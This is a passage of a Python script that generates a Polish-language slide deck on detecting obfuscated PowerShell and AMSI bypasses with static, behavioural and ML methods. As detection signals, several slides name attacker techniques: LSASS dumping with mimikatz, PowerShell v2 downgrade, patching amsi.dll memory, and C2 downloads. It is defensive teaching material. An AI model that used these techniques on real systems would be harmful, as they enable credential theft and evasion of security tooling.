        txbox(s, "↓", 1.35, y+0.88, 0.6, 0.14, size=11, bold=True,
              color=TEXT_GREY, align=PP_ALIGN.CENTER)

# Right annotation — why both ML models?
rect(s, 10.45, 5.42, 2.8, 1.82, BG_DARK)
txbox(s, "Dlaczego oba modele?", 10.5, 5.47, 2.7, 0.35, size=11, bold=True, color=ACCENT_ORG)
txbox(s,
      "Deobfuscowany → intencja\n(LotL może wyglądać normalnie)\n\n"
      "Oryginalny → technika ukrycia\n(nowy styl obfuscacji bez sygnatury)",
      10.5, 5.85, 2.7, 1.3, size=11, color=TEXT_GREY)


# ── Slide V.3 – Layer 1: ML szczegóły ────────────────────────────────────────
s = prs.slides.add_slide(BLANK_LAYOUT)
add_bg(s)
section_header(s, "V", "Layer 1 — ML: features i modele", "")

# Two ML model cards side by side
rect(s, 0.3, 1.3, 6.0, 5.5, BG_CARD)
rect(s, 0.3, 1.3, 6.0, 0.07, RGBColor(0x1A,0x5A,0xAA))
txbox(s, "ML na deobfuscowanym", 0.45, 1.38, 5.7, 0.45, size=16, bold=True, color=TEXT_WHITE)
txbox(s, "Co wykrywa:", 0.45, 1.9, 5.7, 0.32, size=13, bold=True, color=ACCENT_ORG)
feats_deobf = [
    "Niebezpieczne API: Reflection.Load, VirtualProtect",
    "Wzorce C2: Invoke-WebRequest + Base64 URL",
    "Credential access: LSASS, sekurlsa, mimikatz",
    "Persistence: Registry Run, Scheduled Tasks",
    "Lateral movement: WMI, PSRemoting, WinRM",
]
tf = s.shapes.add_textbox(Inches(0.45), Inches(2.28), Inches(5.7), Inches(2.3))
tf.word_wrap = True
for i, f in enumerate(feats_deobf):
    p = tf.text_frame.paragraphs[0] if i == 0 else tf.text_frame.add_paragraph()
    p.space_before = Pt(4)
    r = p.add_run(); r.text = f"▸  {f}"
    r.font.size = Pt(13); r.font.color.rgb = TEXT_WHITE

txbox(s, "Modele:", 0.45, 4.65, 5.7, 0.32, size=13, bold=True, color=ACCENT_ORG)
txbox(s, "Random Forest / Gradient Boosting — szybkie, interpretable\nOne-class SVM — anomaly detection na nowych próbkach",
      0.45, 5.0, 5.7, 0.72, size=13, color=TEXT_WHITE)

rect(s, 7.0, 1.3, 6.0, 5.5, BG_CARD)
rect(s, 7.0, 1.3, 6.0, 0.07, RGBColor(0x50,0x20,0x9A))
txbox(s, "ML na oryginalnym (obfuscowanym)", 7.1, 1.38, 5.7, 0.45, size=16, bold=True, color=TEXT_WHITE)
txbox(s, "Co wykrywa:", 7.1, 1.9, 5.7, 0.32, size=13, bold=True, color=ACCENT_ORG)
feats_obf = [
    "Entropia stringów — wysoka = podejrzane",
    "Ratio Base64 / encoded content w skrypcie",
    "Głębokość warstw encodingu",
    "Fragmentacja identyfikatorów (string split)",
    "Zagęszczenie backtick / format operator",
]
tf = s.shapes.add_textbox(Inches(7.1), Inches(2.28), Inches(5.7), Inches(2.3))
tf.word_wrap = True
for i, f in enumerate(feats_obf):
    p = tf.text_frame.paragraphs[0] if i == 0 else tf.text_frame.add_paragraph()
    p.space_before = Pt(4)
    r = p.add_run(); r.text = f"▸  {f}"
    r.font.size = Pt(13); r.font.color.rgb = TEXT_WHITE

txbox(s, "Modele:", 7.1, 4.65, 5.7, 0.32, size=13, bold=True, color=ACCENT_ORG)
txbox(s, "Autoencoder (TinyML) — rekonstrukcja normalnego kodu\nOne-class SVM — nowe style obfuscacji bez sygnatur",
      7.1, 5.0, 5.7, 0.72, size=13, color=TEXT_WHITE)

# Bottom: output
rect(s, 0.3, 7.0, 12.7, 0.38, ACCENT_RED)
txbox(s, "Output: confidence score per model  →  agregacja do jednego verdict (ramsi-rs)",
      0.3, 7.0, 12.7, 0.38, size=12, bold=True, color=TEXT_WHITE, align=PP_ALIGN.CENTER)


# ── Slide V.4 – Layer 2: Behavioral / Telemetria ─────────────────────────────
s = prs.slides.add_slide(BLANK_LAYOUT)
add_bg(s)
section_header(s, "V", "Layer 2 — Behavioral / Telemetria", "")

CLR_L2 = RGBColor(0x1A,0x7A,0xAA)

# Intro
rect(s, 0.3, 1.3, 12.7, 0.6, BG_CARD)
rect(s, 0.3, 1.3, 0.07, 0.6, CLR_L2)
txbox(s,
      "Nie analizujemy kodu — obserwujemy co system robi. "
      "Źródła: ETW providers, Sysmon, Windows Event Log.",
      0.5, 1.35, 12.2, 0.5, size=14, color=TEXT_WHITE)

# Signal cards — 2 rows x 3 cols
signals = [
    ("Odczyt HKLM\\AMSI\\Providers",
     "Skrypt enumeruje providerów\nprzed bypasem — jak w\nAmsiProviderScanDisruption",
     ACCENT_RED),
    ("PowerShell -version 2",
     "Downgrade do PSv2 omija\nAMSI i Script Block Logging\n— silny sygnał",
     ACCENT_RED),
    ("Podejrzane process tree",
     "winword.exe → powershell.exe\nexplorer.exe → wscript.exe\nmshta.exe → cmd.exe",
     RGBColor(0xC0,0x50,0x10)),
    ("Network z script hosta",
     "powershell.exe / wscript.exe\nnawiązuje połączenie HTTP/S\n— potencjalny C2 download",
     RGBColor(0xC0,0x50,0x10)),
    ("LSASS access",
     "OpenProcess(LSASS) lub\nMiniDumpWriteDump —\ncredential harvesting",
     RGBColor(0x1A,0x7A,0x3C)),
    ("VirtualProtect na amsi.dll",
     "Zmiana ochrony pamięci\nw obszarze amsi.dll —\npatch bypass signal",
     RGBColor(0x1A,0x7A,0x3C)),
]
for i, (title, body, clr) in enumerate(signals):
    col, row = i % 3, i // 3
    x = 0.3 + col * 4.35
    y = 2.15 + row * 2.35
    rect(s, x, y, 4.1, 2.15, BG_CARD)
    rect(s, x, y, 4.1, 0.07, clr)
    txbox(s, title, x+0.1, y+0.1, 3.9, 0.42, size=13, bold=True, color=clr)
    txbox(s, body,  x+0.1, y+0.58, 3.9, 1.45, size=12, color=TEXT_WHITE)

# Bottom ETW note
rect(s, 0.3, 6.85, 12.7, 0.53, BG_DARK)
txbox(s,
      "ETW providers: Microsoft-Windows-PowerShell (4104)  ·  "
      "Microsoft-Antimalware-Scan-Interface  ·  "
      "Microsoft-Windows-Threat-Intelligence  ·  Sysmon EventID 1/7/10",
      0.5, 6.88, 12.2, 0.45, size=11, color=TEXT_GREY, align=PP_ALIGN.CENTER)


# ── Slide 7: V – ramsi-rs + IoCs ─────────────────────────────────────────────
s = prs.slides.add_slide(BLANK_LAYOUT)
add_bg(s)
rect(s, 0, 0, 13.33, 0.85, BG_CARD)
txbox(s, "  Narzędzia detekcji  &  Wskaźniki zagrożenia (IoCs)", 0, 0, 13, 0.85,
      size=22, bold=True, color=TEXT_WHITE)

# ramsi-rs card
rect(s, 0.3, 1.0, 5.8, 5.4, BG_CARD)
txbox(s, "ramsi-rs", 0.5, 1.08, 5.4, 0.42, size=20, bold=True, color=ACCENT_ORG)
txbox(s, "github.com/radkum/ramsi-rs", 0.5, 1.52, 5.4, 0.3, size=12, color=TEXT_GREY)
feats = [
    "Rule-based signatures znanych bypass",
    "Heurystyczny ML scoring (unknown obfuscation)",
    "Integracja z endpoint telemetry",
    "Low-resource (native Rust — działa na agentach)",
    "Actionable alerts z confidence scores",
    "Feature vectors → SIEM / downstream ML",
]
tf = s.shapes.add_textbox(Inches(0.5), Inches(1.92), Inches(5.4), Inches(4.3))
tf.word_wrap = True
for i, f in enumerate(feats):
    p = tf.text_frame.paragraphs[0] if i == 0 else tf.text_frame.add_paragraph()
    p.space_before = Pt(5)
    run = p.add_run()
    run.text = f"▸  {f}"
    run.font.size = Pt(14)
    run.font.color.rgb = TEXT_WHITE

# IoC cards
ioc_groups = [
    ("Reflection indicators", [
        "System.Reflection.Assembly.Load()",
        "MethodInfo / GetField() / Invoke()",
    ]),
    ("Obfuscation indicators", [
        "Base64 w plain tekście",
        "Excessive string concatenation",
        "Multiple encoding layers",
    ]),
    ("AMSI-specific", [
        "UnmanagedCode permissions",
        "kernel32.dll imports",
        "Memory tampering patterns",
    ]),
]
for i, (title, items) in enumerate(ioc_groups):
    y = 1.0 + i * 1.85
    add_card(s, 6.5, y, 6.5, 1.7, title, items)


# ── Slide 8: VI – Demo ───────────────────────────────────────────────────────
s = prs.slides.add_slide(BLANK_LAYOUT)
add_bg(s)
section_header(s, "VI", "Live Demo  –  Hybrid Detection Pipeline", "5 minut")

steps = [
    ("1", "Obfuscated sample",        "Załadowanie celowo obfuscowanego skryptu PowerShell"),
    ("2", "ps-parser analysis",       "Rozwinięcie obfuscacji → czysty AST + feature extraction"),
    ("3", "ramsi-rs detection",       "Rule-based check + ML scoring → confidence score"),
    ("4", "Alert & verdict",          "Actionable alert z wyjaśnieniem dlaczego flagged"),
]
for i, (num, title, desc) in enumerate(steps):
    x = 0.4 + i * 3.2
    rect(s, x, 1.5, 2.8, 3.5, BG_CARD)
    rect(s, x, 1.5, 2.8, 0.65, ACCENT_RED)
    txbox(s, num, x, 1.5, 2.8, 0.65, size=28, bold=True,
          color=TEXT_WHITE, align=PP_ALIGN.CENTER)
    txbox(s, title, x+0.1, 2.25, 2.6, 0.45, size=14, bold=True, color=ACCENT_ORG)
    txbox(s, desc,  x+0.1, 2.75, 2.6, 2.1,  size=13, color=TEXT_WHITE)
    if i < 3:
        txbox(s, "→", x+2.8, 2.85, 0.4, 0.5, size=20, color=ACCENT_ORG)

txbox(s, "Środowisko: sandboxowana VM  ·  Sample przygotowany wcześniej  ·  Backup slides dostępne",
      0.4, 5.3, 12.5, 0.4, size=13, color=TEXT_GREY, align=PP_ALIGN.CENTER)


# ── Slide 9: VII – Summary ───────────────────────────────────────────────────
s = prs.slides.add_slide(BLANK_LAYOUT)
add_bg(s)
section_header(s, "VII", "Podsumowanie", "3 minut")

takeaways = [
    ("AMSI to niezbędna warstwa...",     "...ale nie jedyna. Bez dodatkowych warstw daje się ominąć."),
    ("Obfuscacja jest łatwa...",          "...ale detekowalna przy poprawnym podejściu statycznym + ML."),
    ("Obrona musi być wielowarstwowa",    "Static → Behavioral → Telemetry → Hybrid ML."),
    ("Hybrid ML = przyszłość detekcji",   "Rule + ML = lepsze wyniki bez black-box gotchas."),
]
for i, (h, d) in enumerate(takeaways):
    y = 1.4 + i * 1.35
    rect(s, 0.3, y, 0.08, 0.9, ACCENT_RED)
    txbox(s, h, 0.6, y,      12.3, 0.45, size=16, bold=True, color=TEXT_WHITE)
    txbox(s, d, 0.6, y+0.45, 12.3, 0.55, size=14, color=TEXT_GREY)

rect(s, 0, 6.3, 13.33, 1.2, ACCENT_RED)
txbox(s, "Q&A", 0, 6.3, 13.33, 1.2, size=34, bold=True,
      color=TEXT_WHITE, align=PP_ALIGN.CENTER)


# ── Save ─────────────────────────────────────────────────────────────────────
out = r"C:\VSExclude\confidence\AMSI_vs_Obfuscation.pptx"
prs.save(out)
print(f"Saved: {out}")
print(f"Slides: {len(prs.slides)}")
